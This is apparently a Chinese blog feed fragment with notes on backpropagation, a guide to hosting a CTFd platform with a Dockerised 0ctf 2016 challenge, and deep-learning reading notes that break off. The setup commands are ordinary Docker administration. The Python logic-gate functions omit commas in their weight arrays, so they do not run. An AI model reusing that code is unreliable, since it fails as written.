title="反向传播"></a>反向传播</h3><p>反向传播的计算顺序</p><blockquote><p>先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点</p></blockquote><ul><li>加法节点的反向传播</li></ul><p>加法节点的反向传播只乘以1</p><ul><li>乘法节点的反向传播</li></ul><p>乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游</p><p>对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd搭建</title>
      <link href="2021/11/28/ctf_contest_platform_build/"/>
      <url>2021/11/28/ctf_contest_platform_build/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF比赛平台搭建"><a href="#CTF比赛平台搭建" class="headerlink" title="CTF比赛平台搭建"></a>CTF比赛平台搭建</h1><a id="more"></a><h2 id="克隆CTFd"><a href="#克隆CTFd" class="headerlink" title="克隆CTFd"></a>克隆CTFd</h2><p>GitHub：<a href="https://github.com/CTFd/CTFd">https://github.com/CTFd/CTFd</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git                                                128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;CTFd&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 14012, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (869/869), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (555/555), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143</span><br><span class="line">Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (8691/8691), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo apt install docker docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ docker --version</span><br><span class="line">Docker version 20.10.8+dfsg1, build 3967b7d</span><br><span class="line">                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ docker-compose --version</span><br><span class="line">docker-compose version 1.27.4, build unknown</span><br></pre></td></tr></table></figure><h2 id="添加执行权限"><a href="#添加执行权限" class="headerlink" title="添加执行权限"></a>添加执行权限</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="在CTFd根目录下启动docker"><a href="#在CTFd根目录下启动docker" class="headerlink" title="在CTFd根目录下启动docker"></a>在CTFd根目录下启动docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo docker-compose up -d                                                                      130 ⨯</span><br><span class="line">Creating network <span class="string">&quot;ctfd_internal&quot;</span> with the default driver</span><br><span class="line">Creating network <span class="string">&quot;ctfd_default&quot;</span> with the default driver</span><br><span class="line">Pulling db (mariadb:10.4.12)...</span><br><span class="line">10.4.12: Pulling from library/mariadb</span><br><span class="line">23884877105a: Pull complete</span><br><span class="line">bc38caa0f5b9: Pull complete</span><br><span class="line">2910811b6c42: Pull complete</span><br><span class="line">36505266dcc6: Pull complete</span><br><span class="line">e69dcc78e96e: Pull complete</span><br><span class="line">222f44c5392d: Pull complete</span><br><span class="line">efc64ea97b9c: Pull complete</span><br><span class="line">9912a149de6b: Pull complete</span><br><span class="line">7ef6cf5b5697: Pull complete</span><br><span class="line">8a05be3688e0: Pull complete</span><br><span class="line">c09ffdc1b660: Pull complete</span><br><span class="line">2eb7fe288fc8: Pull complete</span><br><span class="line">b41d1cc4d40f: Pull complete</span><br><span class="line">a92376500910: Pull complete</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>注：首次启动由于下载依赖等会比较慢</p><h2 id="平台配置"><a href="#平台配置" class="headerlink" title="平台配置"></a>平台配置</h2><p>打开浏览器，输入127.0.0.1:8000配置赛事相关信息</p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" srcset="data:image/png;base64,666" alt="GFgMuY.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" srcset="data:image/png;base64,666" alt="GFgTJ9.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" srcset="data:image/png;base64,666" alt="GFgWcX.png"></p><h2 id="添加题目"><a href="#添加题目" class="headerlink" title="添加题目"></a>添加题目</h2><p>在GitHub上找题目，clone到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/CTFTraining.git</span><br><span class="line">Cloning into <span class="string">&#x27;CTFTraining&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 86, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86</span><br><span class="line">Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (48/48), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>实际测试发现不能把所有的题目都clone下来，就先试一道题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 32, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32</span><br><span class="line">Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (3/3), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>docker images 命令查看已有镜像</p><p>docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker build ./ -t 0ctf_2016_unserialize                     </span><br><span class="line">Sending build context to Docker daemon  1.841MB</span><br><span class="line">Step 1/8 : FROM php:5.6-fpm-alpine</span><br><span class="line">5.6-fpm-alpine: Pulling from library/php</span><br><span class="line">169185f82c45: Pull complete </span><br><span class="line">8ba0d98519aa: Pull complete </span><br><span class="line">75f762bbc102: Pull complete </span><br><span class="line">04f939cd9fe5: Pull complete </span><br><span class="line">5feedbe48aa1: Pull complete </span><br><span class="line">47e0f87348c0: Pull complete </span><br><span class="line">68b7fb9d3c14: Pull complete </span><br><span class="line">7e4b086d6b5d: Pull complete </span><br><span class="line">a15e624700d4: Pull complete </span><br><span class="line">f714654cc532: Pull complete </span><br><span class="line">Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker images                                                                                                                                                        1 ⨯</span><br><span class="line">REPOSITORY              TAG               IMAGE ID       CREATED          SIZE</span><br><span class="line">0ctf_2016_unserialize   latest            931233916db0   2 minutes ago    333MB</span><br><span class="line">ctfd_ctfd               latest            b36ee26f2439   49 minutes ago   791MB</span><br><span class="line">python                  3.7-slim-buster   cd7d26aa86ac   10 days ago      113MB</span><br><span class="line">nginx                   1.17              9beeba249f3e   18 months ago    127MB</span><br><span class="line">mariadb                 10.4.12           b6184b68d1fd   19 months ago    357MB</span><br><span class="line">redis                   4                 191c4017dcdd   19 months ago    89.3MB</span><br><span class="line">ubuntu                  18.10             9dc19675e327   2 years ago      67.3MB</span><br><span class="line">php                     5.6-fpm-alpine    6feac8f2ef42   2 years ago      54.5MB</span><br><span class="line">php                     5-apache-jessie   d34f09f63596   2 years ago      374MB</span><br></pre></td></tr></table></figure><p>再通过镜像创建容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize</span><br></pre></td></tr></table></figure><p>查看现有容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker ps                                                                   </span><br><span class="line">CONTAINER ID   IMAGE                   COMMAND                  CREATED          STATUS          PORTS                                               NAMES</span><br><span class="line">9cae78cf79bc   0ctf_2016_unserialize   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   5 seconds ago    Up 4 seconds    9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp   0ctf_2016_unserialize</span><br><span class="line">3b3889db12c7   nginx:1.17              <span class="string">&quot;nginx -g &#x27;daemon of…&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                   ctfd_nginx_1</span><br><span class="line">7b58b9661715   ctfd_ctfd               <span class="string">&quot;/opt/CTFd/docker-en…&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp           ctfd_ctfd_1</span><br><span class="line">93e49564bff7   mariadb:10.4.12         <span class="string">&quot;docker-entrypoint.s…&quot;</span>   57 minutes ago   Up 57 minutes                                                       ctfd_db_1</span><br><span class="line">9f4380eb4639   redis:4                 <span class="string">&quot;docker-entrypoint.s…&quot;</span>   57 minutes ago   Up 57 minutes</span><br></pre></td></tr></table></figure><p>访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口</p><p><a href="https://www.helloimg.com/image/GFrlx9"><img src="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" srcset="data:image/png;base64,666" alt="GFrlx9.png"></a></p><p>打开题目容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t &lt;container&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>为题目添加flag：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker <span class="built_in">exec</span> -i -t 0ctf_2016_unserialize /bin/sh                                                                                                                      1 ⨯</span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br><span class="line">/var/www/html <span class="comment"># echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt</span></span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    flag.txt      index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br></pre></td></tr></table></figure><p>最后在后台添加题目地址等信息<br><img src="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" srcset="data:image/png;base64,666" alt="GFVPrX.png"><br><img src="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" srcset="data:image/png;base64,666" alt="GFVFO9.png"></p><p><a href="https://www.helloimg.com/image/GFVxLn"><img src="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" srcset="data:image/png;base64,666" alt="GFVxLn.png"></a></p><p>同理可添加其他题目</p><h2 id="搭建中遇到的问题"><a href="#搭建中遇到的问题" class="headerlink" title="搭建中遇到的问题"></a>搭建中遇到的问题</h2><ul><li>git clone 命令克隆失败：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;</span>: Failed to connect to github.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p>由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来</p><ul><li><p>有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]</span><br><span class="line">└─$ sudo docker build ./ -t urlstorage                                                                                                                                        1 ⨯</span><br><span class="line">Sending build context to Docker daemon  282.6kB</span><br><span class="line">Step 1/7 : FROM ubuntu:18.10</span><br><span class="line">18.10: Pulling from library/ubuntu</span><br><span class="line">8a532469799e: Pull complete </span><br><span class="line">32f4dcec3531: Pull complete </span><br><span class="line">230f0701585e: Pull complete </span><br><span class="line">e01f70622967: Pull complete </span><br><span class="line">Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686c</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:18.10</span><br><span class="line"> ---&gt; 9dc19675e327</span><br><span class="line">Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=<span class="string">&quot;2.1.1&quot;</span></span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 98e854ac92f3</span><br><span class="line">Removing intermediate container 98e854ac92f3</span><br><span class="line"> ---&gt; 154a521cb653</span><br><span class="line">Step 3/7 : RUN sed -i <span class="string">&#x27;s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g&#x27;</span> /etc/apt/sources.list &amp;&amp;     sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 8d702a730242</span><br><span class="line">Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InRelease</span><br><span class="line">Ign:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InRelease</span><br><span class="line">Ign:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InRelease</span><br><span class="line">Err:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Reading package lists...</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27;</span> does not have a Release file.</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27;</span> does not have a Release file.                                                               </span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27;</span> does not have a Release file.                                                             </span><br><span class="line">The <span class="built_in">command</span> <span class="string">&#x27;/bin/sh -c sed -i &#x27;</span>s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     sed -i &#x27;</span>/security/d<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27;</span> returned a non-zero code: 100</span><br></pre></td></tr></table></figure></li><li><p>许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch</title>
      <link href="2021/11/28/deep_learning_from_scratch/"/>
      <url>2021/11/28/deep_learning_from_scratch/</url>
      
        <content type="html"><![CDATA[<h1 id="读书记录"><a href="#读书记录" class="headerlink" title="读书记录"></a>读书记录</h1><a id="more"></a><h2 id="收获："><a href="#收获：" class="headerlink" title="收获："></a>收获：</h2><ul><li><p>对matplotlib、numpy有了初步认识</p></li><li><p>了解了一些基础概念</p></li><li><p>跟随书本实现了简单的逻辑门电路</p></li><li><p>认识了感知机、激活函数</p></li></ul><h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy:"></a>numpy:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array([<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>]) <span class="comment">#生成数组</span></span><br><span class="line">print(x)</span><br><span class="line">print(x.dtype)<span class="comment">#查看数据类型</span></span><br><span class="line">print(x.shape)<span class="comment">#查看矩阵形状</span></span><br><span class="line">x = x.flatten()<span class="comment">#将矩阵转换为一维数组</span></span><br></pre></td></tr></table></figure><h3 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.image <span class="keyword">import</span> imread</span><br><span class="line"></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">y = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line">plt.plot(x, y)<span class="comment">#绘制图形</span></span><br><span class="line">plt.show()<span class="comment">#显示坐标系</span></span><br><span class="line"></span><br><span class="line">img = imread(<span class="string">&quot;lena.png&quot;</span>)</span><br><span class="line">plt.imshow(img)<span class="comment">#显示图像</span></span><br></pre></td></tr></table></figure><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul>    <li>广播：将与矩阵相乘的标量转换为相应大小矩阵的功能</li>    <li>张量：一般化之后的向量或矩阵</li>    <li>感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。</li></ul><h3 id="简单逻辑门的实现"><a href="#简单逻辑门的实现" class="headerlink" title="简单逻辑门的实现"></a>简单逻辑门的实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NAND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">-0.5</span> <span class="number">-0.5</span>])</span><br><span class="line">    b = <span class="number">0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.2</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    s1 = NAND(x1, x2)</span><br><span class="line">    s2 = OR(x1, x2)</span><br><span class="line">    y = AND(s1, s2)</span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><h3 id="感知机"><a href="#感知机" class="headerlink" title="感知机"></a>感知机</h3><h4 id="感知机的局限性"><a href="#感知机的局限性" class="headerlink" title="感知机的局限性"></a>感知机的局限性</h4><p>​    单层感知机只能表示线性空间</p><h4 id="多层感知机的优势"><a href="#多层感知机的优势" class="headerlink" 